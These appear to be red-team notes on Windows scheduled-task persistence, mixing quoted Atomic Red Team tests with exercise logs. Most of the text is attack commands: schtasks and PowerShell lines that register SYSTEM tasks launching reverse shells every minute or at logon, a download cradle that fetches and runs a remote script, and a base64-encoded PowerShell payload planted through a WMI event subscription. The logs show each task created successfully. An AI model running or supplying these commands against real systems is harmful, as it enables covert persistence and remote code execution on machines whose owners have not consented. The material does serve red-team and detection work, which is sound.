# Red Team Notes

## Requirements

- impacket (https://github.com/fortra/impacket)
- TCP shell
- have creds

## Attack Attempts

**NEW Scheduled Tasks**
1. New Scheduled Task (schtasks.exe)

2. PowerShell

3. .NET 

4. PowerShell ISE

**MODIFY Scheduled Tasks**

5. Modified an existing task
    - Download cradle .bat/vba script
        - (no download cradle - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md#atomic-test-9---powershell-modify-a-scheduled-task)

        ```powershell
        powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://example.com/myscript.bat')"
        ```

6. Registry/xml modification without creating an event

**REMOTE Scheduled Task Creation**

6. impacket wmi
    - https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet.pdf 


## Techniques / Notes

At utility to create task
- registry key specifically associated with the creation of a scheduled task on the destination host at: Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\At1.

Creating a new scheduled task that will launch shell.cmd every minute:
attacker@victim
```powershell
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
```

[APT3](https://attack.mitre.org/groups/G0022) downloader creates persistence by creating the following scheduled task: 
```powershell
schtasks /create /tn "mysc" /tr C:\Users\Public\test.exe /sc ONLOGON /ru "System"
```

Atomic Red Team: 
- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md#atomic-test-1---scheduled-task-startup-script

Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.
```powershell
$xml = [System.IO.File]::ReadAllText("#{xml_path}")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
```
Clean up commands: 
```powershell
Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false >$null 2>&1

https://atomicredteam.io/privilege-escalation/T1053.005/#atomic-test-6---wmi-invoke-cimmethod-scheduled-task
```

## Atomic Test #9 - PowerShell Modify A Scheduled Task
Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. It will first be created to spawn cmd.exe, but modified to run notepad.exe.


Upon successful execution, powershell.exe will create a scheduled task and modify the action.


Supported Platforms: Windows

auto_generated_guid: dda6fc7b-c9a6-4c18-b98d-95ec6542af6d

**Attack Commands: Run with powershell!**
```powershell
$Action = New-ScheduledTaskAction -Execute "cmd.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTaskModifed -InputObject $object
$NewAction = New-ScheduledTaskAction -Execute "Notepad.exe"
Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction
```

References:
- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md#atomic-test-9---powershell-modify-a-scheduled-task
- https://www.ired.team/offensive-security/persistence/t1053-schtask
- https://github.com/KnightsofRen-CS/CS2022-OPFOR/blob/main/3_CRONOS_PRIMO/evil-winrm-chain.md


```powershell
invoke-assembly sharpstay.exe action=WMIEventSub command="powershell.exe -Enc cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAbQBwAC4AZABsAGwALABSAHUAbgAgAGgAdAB0AHAAcwA6AC8ALwB7AEQATwBNAEEASQBOAH0A" eventname=UserService attime=startup
```

## MSELS: 

**1.01**
```powershell 
cmd.exe /c SCHTASKS /CREATE /SC MINUTE /TN dnscache /TR c:\dongle\reversecmd1.exe /RU SYSTEM /f
```
> SUCCESS: The scheduled task "dnscache" has successfully been created.

**2.01**
```powershell
schtasks /create /sc minute /tn startuptask /tr C:\medium\shell.exe /ru SYSTEM /f
```
> SUCCESS: The scheduled task "startuptask" has successfully been created.

